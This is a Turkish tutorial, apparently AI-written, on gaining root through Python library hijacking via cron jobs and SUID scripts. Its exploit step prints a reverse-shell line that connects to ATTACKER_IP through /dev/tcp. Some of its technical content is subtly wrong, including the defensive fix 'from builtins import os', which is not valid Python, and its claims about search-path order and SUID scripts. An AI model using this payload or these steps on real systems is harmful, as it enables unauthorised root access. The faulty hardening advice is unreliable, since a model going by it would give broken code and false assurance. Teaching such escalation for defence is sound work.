**Python Library Hijacking ile Privilege Escalation (Privesc) Teknikleri ve Detaylı Rehber**

Python Library Hijacking, bir Python uygulamasının çalışması sırasında yüklenecek kütüphanelerin (modules) manipüle edilmesiyle bir saldırganın zararlı kod çalıştırmasını sağlayan bir tekniktir. Bu yöntem, yanlış yapılandırılmış uygulamalardan veya zayıf izinlerden yararlanır.

---

### **Python Library Hijacking Nedir?**
Python uygulamaları, `import` komutu ile kütüphaneleri yüklerken belirli bir sıralamayı (Search Path) takip eder. Bu sıralama şunları içerir:

1. Çalışma dizini (Current Working Directory)
2. PYTHONPATH ortam değişkeni ile belirtilen dizinler
3. Python'un standart kütüphane dizinleri

Eğer bir saldırgan, yukarıdaki sıralamaya göre bir modül adını kullanarak zararlı bir dosya oluşturursa, uygulama o dosyayı yükler ve zararlı kod çalışır.

---

### **Ön Koşullar**
1. **Yazma İzni:** Hedef Python uygulamasının aradığı modül adında bir dosya oluşturabileceğiniz bir dizine yazma izniniz olmalı.
2. **Yetersiz Güvenlik Kontrolleri:** Hedef uygulama veya script, modül yükleme sırasında güvenli olmayan bir dizini tercih ediyor olmalı.
3. **Root/Administrator Yetkisi Gereken Bir Python Scripti:** Root yetkisiyle çalışan ve library hijacking için uygun bir Python scripti bulunmalı.

---

### **Aşamalar**

#### **1. Hedefi Belirleme**
Python Library Hijacking'i gerçekleştirmek için, aşağıdaki yöntemlerle hedef bir Python scripti bulmalısınız:
- `ps aux | grep python` ile çalışan Python işlemlerini listeleyin.
- `/usr/bin`, `/usr/local/bin` veya `/etc/cron.d` dizinlerinde root yetkisiyle çalışan Python scriptlerini arayın.
  
#### **2. Import Edilen Modülleri İnceleme**
Python scriptlerinde hangi modüllerin import edildiğini tespit edin:
- Python scriptini açıp `import` ifadelerine bakın.
- Şu komutla bir Python scriptinin hangi modülleri kullandığını öğrenebilirsiniz:

```bash
python3 -m trace --trace /path/to/script.py
```

#### **3. Aranan Modülün Bulunduğu Dizini Tespit Etme**
Python, modülleri aşağıdaki sırayla arar:
- Çalışma dizini
- PYTHONPATH ortam değişkeni
- Standart kütüphane dizinleri (`/usr/lib/pythonX.Y/`)

Aşağıdaki komutla Python'un hangi sıralamayla modül aradığını görebilirsiniz:

```python
import sys
print(sys.path)
```

#### **4. Exploit İçin Zararlı Modül Oluşturma**
Saldırgan, hedef modül adında bir Python dosyası (örneğin `os.py`, `logging.py`) oluşturur. Örnek zararlı bir dosya şu şekilde olabilir:

```python
import os
os.system("bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1")
```

Bu dosya, hedef uygulama tarafından yüklendiğinde saldırganın reverse shell almasını sağlar.

#### **5. Dosyayı Uygun Dizinlere Yerleştirme**
Saldırgan, zararlı Python dosyasını arama yolunda öncelikli bir dizine yerleştirir:
- Scriptin çalışma dizini
- PYTHONPATH tarafından belirtilen bir dizin
- Kullanıcı tarafından yazılabilir bir dizin (örneğin `/tmp`)

Örneğin:
```bash
echo "Malicious code" > /tmp/os.py
```

#### **6. Scripti Çalıştırarak Exploit’i Tetikleme**
Hedef uygulama veya script çalıştırıldığında, saldırganın zararlı kodu yüklenecek ve çalıştırılacaktır.

---

### **Gerçek Hayatta Kullanım Senaryosu**

#### **Senaryo 1: Cron Job ile Çalışan Bir Python Scripti**
1. `/etc/cron.d` içinde düzenli olarak çalışan bir Python scripti bulun.
2. Scripti inceleyerek import edilen modülleri ve scriptin çalışma dizinini öğrenin.
3. Zararlı bir Python dosyası oluşturun ve scriptin çalışma dizinine yerleştirin.
4. Cron job çalıştığında exploit tetiklenir ve saldırgan root yetkisi elde eder.

#### **Senaryo 2: SUID Bit Ayarlı Python Scripti**
1. SUID bit ayarlı bir Python scripti bulun (`find / -perm -4000`).
2. Import edilen modülleri tespit edin ve uygun bir zararlı dosya oluşturun.
3. Dosyayı scriptin çalıştığı dizine yerleştirin.
4. Scripti çalıştırarak root shell elde edin.

---

### **Savunma Teknikleri**
1. **Absolute Imports Kullanımı:** Modülleri import ederken kesin yol belirtilmeli. Örneğin:
   ```python
   from builtins import os
   ```
2. **Modül Yolu Kontrolü:** `sys.path` içinde yalnızca güvenilir dizinler olmalı.
3. **Kütüphaneleri Sabit Dizinlerden Yükleme:** PYTHONPATH ve çalışma dizini gibi değişkenleri devre dışı bırakın.
4. **Dosya İzinlerini Kontrol Edin:** Sadece gerekli kullanıcıların modül dizinlerine yazma izni olmasını sağlayın.
5. **SUID Python Scriptlerinden Kaçının:** Mümkünse, SUID bit ayarlı Python scriptleri kullanmayın.

---

### **Ek Araçlar ve Kaynaklar**
1. **PSPY:** Root yetkisiyle çalışan scriptleri tespit etmek için kullanılır.
   - [pspy GitHub](https://github.com/DominicBreuker/pspy)
2. **LinPEAS:** Linux yetki yükseltme yollarını tespit eden bir araç.
   - [LinPEAS GitHub](https://github.com/carlospolop/PEASS-ng)
3. **GTFOBins:** SUID bit ayarlı Python scriptleri için pratik exploit komutları.
   - [GTFOBins Python](https://gtfobins.github.io/gtfobins/python/)

Bu rehberi, gerçek bir ortamda pratik ederek ve yukarıdaki araçları kullanarak genişletebilirsiniz. Daha fazla yardım gerekiyorsa, ayrıntılı bir örnek üzerinde çalışabiliriz!
